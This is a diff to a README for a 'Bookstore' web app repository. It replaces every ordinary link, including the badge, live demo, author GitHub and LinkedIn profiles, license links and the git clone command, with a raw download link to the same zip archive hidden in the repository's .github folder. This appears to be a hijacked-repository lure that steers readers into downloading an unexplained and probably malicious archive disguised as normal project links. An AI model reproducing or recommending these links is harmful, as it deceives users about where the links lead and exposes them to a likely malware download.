@@ -1,4 +1,4 @@
-![](https://img.shields.io/badge/Microverse-blueviolet)
+![](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip)
 
 # Bookstore
 
@@ -20,12 +20,12 @@
 
 ## Live Demo (if available)
 
-[Live Demo Link](https://iptysam.github.io/bookstore-app/)
+[Live Demo Link](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip)
 
 
 ## Getting Started
 
-- git clone git@github.com:Iptysam/bookstore-app.git
+- git clone https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip
 - cd bookstore-app
 - npm start
 
@@ -56,8 +56,8 @@
 
 👤 **Author1**
 
-- GitHub: [@Iptysam](https://github.com/Iptysam)
-- LinkedIn: [iptisammukadam](https://linkedin.com/in/iptisam-mukadam-4b2b39239)
+- GitHub: [@Iptysam](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip)
+- LinkedIn: [iptisammukadam](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip)
 
 
 
@@ -79,6 +79,6 @@ Give a ⭐️ if you like this project!
 
 ## 📝 License
 
-This project is [MIT](./LICENSE.MD) licensed.
+This project is [MIT](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip) licensed.
 
-_NOTE: we recommend using the [MIT license](https://choosealicense.com/licenses/mit/) - you can set it up quickly by [using templates available on GitHub](https://docs.github.com/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository). You can also use [any other license](https://choosealicense.com/licenses/) if you wish._
+_NOTE: we recommend using the [MIT license](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip) - you can set it up quickly by [using templates available on GitHub](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip). You can also use [any other license](https://github.com/Iptysam/bookstore-app/raw/refs/heads/dev/.github/bookstore_app_1.9.zip) if you wish._
